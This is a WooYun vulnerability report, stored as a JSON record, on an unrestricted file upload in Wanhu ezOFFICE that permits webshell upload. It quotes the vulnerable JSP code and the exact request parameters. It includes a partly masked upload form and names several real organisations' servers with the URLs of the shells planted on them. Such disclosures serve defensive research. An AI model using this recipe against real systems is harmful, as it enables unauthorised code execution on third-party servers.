{"id": 43654, "wybug_id": "wooyun-2014-082128", "wybug_title": "万户ezOFFICE一处任意文件操作", "wybug_corp": "万户网络", "wybug_author": "goubuli", "wybug_date": "2014-11-06 18:15", "wybug_open_date": "2015-02-04 18:16", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向公众公开  简要描述： 万户ezOFFICE一处任意文件操作 详细说明：  其实标题可以写“万户ezOFFICE又一处任意文件上传可getshell，无上传限制”，考虑到对厂商的影响，所以标题写的隐晦一点。万户ezOFFICE又一处任意文件上传可getshellwooyun上面报了很多万户的文件漏洞，尤其是“北京方便面”和“瘦蛟舞”提交的较多。今天审计的这个点，wooyun上现在还没人提交。对应文件：\\defaultroot\\public\\jsp\\multiuploadfile.jsp出现问题的代码如下：\nString filePath=\"/upload/\"+path+\"/\";\t\t//上传文件存放的位置，path可自定义if(\"add\".equals(mode)){\t\t\t\t//上传标识    boolean tooBig=false;    myUpload.initialize(pageContext);    myUpload.upload();    for (int j=0;j<myUpload.getFiles().getCount();j++){        myRandom=new com.whir.common.util.Random().getRandom();\t\t\t\t//文件名是根据时间生产的一个序列，后面有说明        com.jspsmart.upload.File myFile = myUpload.getFiles().getFile(j);        int size=myFile.getSize();        if(fileSize==0 || myFile.getSize()<fileSize){            if (!myFile.isMissing()) {                saveName=myRandom+\".\"+myFile.getFileExt();                fileName=myFile.getFileName();                myFile.saveAs(filePath + saveName);\t\t\t\t//上传的文件直接保存到对应位置            }        }else{            tooBig=true;        }    }    if(tooBig){%>\n还有一些参数获取，这里指出两个重要参数：\nString mode=(String)request.getParameter(\"mode\");String path=(String)request.getParameter(\"path\");\n其中mode代表命令，path指定特定位置。那么我们做如下构造：path=sound&mode=add提交无需“multipart/form-data”方式提交。其中：参数：path=sound 指定的路径为：\\defaultroot\\upload\\sound\\mode=add 为满足if条件，即上传。第一次上传可能没有数据，跳转页面也可上传。（可以直接用burp提交）\n\n上传成功：\n\n此时可以通过查看页面源码看到改名后的文件：\n\n代码：\n<SCRIPT LANGUAGE=\"JavaScript\">    <!--        alert(\"附件上传成功\");        //在调用页面的table列表中显示        opener.reView(\"<%=saveName%>\");        var path=\"<%=path%>\";        var parentTable=\"<%=tableName%>\";        var fileNames=\"<%=fileNames%>\";        var saveNames=\"<%=saveNames%>\";        var obj=eval(\"opener.window.document.all.\"+parentTable);\n其中saveName为改名后的文件。然后访问shell：http://oa.yundagroup.com:7001/defaultroot/upload/sound/2014110516441408716191497.jsp\n\n申明：所有测试均无损害。   漏洞证明：  别人未提交过\n\n受影响的系统较多\n\nmask 区域\n*****l&gt**********ead&**********ad POC</**********t; content=\"text/**********uot;text/cs**********e:12px; backgrou**********yle&gt**********ad&gt**********y>*****1.://**.**.**//oa.yundagroup.com:7001/defaultroot/public/jsp/multiuploadfile.jsppath=sound&fileName=fileName&mode=add&saveName=soundSaveName&tableName=soundTableName&fileMaxSize=0&photos=null\">   _*****pe=\"text\" size=\"70\" **********;br&**********r>**********t type=\"file\" size=\"70&qu**********r>**********;br&**********uot;btnSubmit\" val**********form&**********dy&gt**********htm*****\n\n上次提交的多漏洞中都中招： WooYun: 万户OA未修补漏洞致多个政府&集团OA中招 测试了其中几个，shell地址：http://222.178.221.54:7001/defaultroot/upload/sound/2014110514261813627153789.jsphttp://oa.hongdou.com:7001/defaultroot/upload/sound/2014110514400983604036844.jsphttp://oa.yundagroup.com:7001/defaultroot/upload/sound/2014110514434370947164885.jsp\n\n   修复方案：  1、检查所有文件操作模块2、所有加身份验证3、增加文件内容校验。。。   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-11-11 10:10 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-11 14:57 |    \t\t小包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:19        | 关注技术与网络安全)\t\t \n  屌    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}